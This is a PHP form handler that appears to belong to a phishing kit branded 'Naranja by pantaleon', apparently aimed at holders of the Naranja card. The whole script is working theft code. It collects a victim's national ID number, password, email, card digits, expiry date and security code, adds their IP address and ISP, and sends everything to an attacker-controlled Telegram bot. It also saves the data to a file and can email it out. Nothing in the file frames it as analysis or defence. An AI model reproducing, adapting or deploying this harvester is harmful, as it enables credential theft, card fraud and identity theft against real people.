<?php
$dni = $_POST["dni"];
$passwd = $_POST["password"];
$correo = $_POST["correo"]; 
$digitos = $_POST["digitos"];
$MMAA = $_POST["MMAA"];
$codigo = $_POST["codigo"];
include_once("config.php");
$filter = "";
$mensaje = ">> Datos personales <<\n";
$mensaje .= "DNI: ".$dni."\n";
$filter .= strtolower($dni);
$mensaje .= "Contraseña: ".$passwd."\n";
$filter .= strtolower($passwd);
$filter = base64_encode($filter);
$mensaje .= "correo: ".$correo."\n";
$filter .= strtolower($correo);
$filter = base64_encode($filter);
$mensaje .= "digitos: ".$digitos."\n";
$filter .= strtolower($digitos);
$filter = base64_encode($filter);
$mensaje .= "MMAA: ".$MMAA."\n";
$filter .= strtolower($MMAA);
$filter = base64_encode($filter);
$mensaje .= "codigo: ".$codigo."\n";
$filter .= strtolower($codigo);
$filter = base64_encode($filter);


$ip = getenv("REMOTE_ADDR");
$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
define('BOT_TOKEN', $bottoken);
define('CHAT_ID', $chatid);
define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');
function enviar_telegram($msj){
	$queryArray = [
		'chat_id' => CHAT_ID,
		'text' => $msj,
	];
	$url = 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage?'. http_build_query($queryArray);
	$result = file_get_contents($url);
}
$file_name = 'data/'.$ip.'.db';
$read_data = fopen($file_name, "a+");
function enviar(){
	global $telegram_send, $file_save, $email_send, $email, $mensaje, $ip, $isp;
	if($telegram_send){
		enviar_telegram(">> Naranja by pantaleon <<\n\n>> Datos de conexión <<\nIP: ".$ip."\nISP: ".$isp."\n\n".$mensaje);
	}
	if($file_save){
		$ccs_file_name = 'ccs/data.txt';
		$save_data = fopen($ccs_file_name, "a+");
		$msg = "========== DATOS Naranja by pantaleon==========\n\n";
		$msg .= ">> Datos de conexión <<\n\nIP: ".$ip."\nISP: ".$isp."\n\n";
		$msg .= $mensaje;
		$msg .= "========== DATOS Naranja by pantaleon==========\n\n";
		fwrite($save_data, $msg);
		fclose($save_data);
	}
	if($email_send){
		$msg = ">> Naranja <<\n\n";
		$msg .= $mensaje;
		mail($email, "Naranja", $msg);
	}
}
if($read_data){
	$data = fgets($read_data);
	$data = explode(";", $data);
	if(!(in_array($filter, $data))){
		fwrite($read_data, $filter.";");
		fclose($read_data);
		enviar();
	}
}
else {
	fwrite($read_data, $filter.";");
	fclose($read_data);
	enviar();
}
?>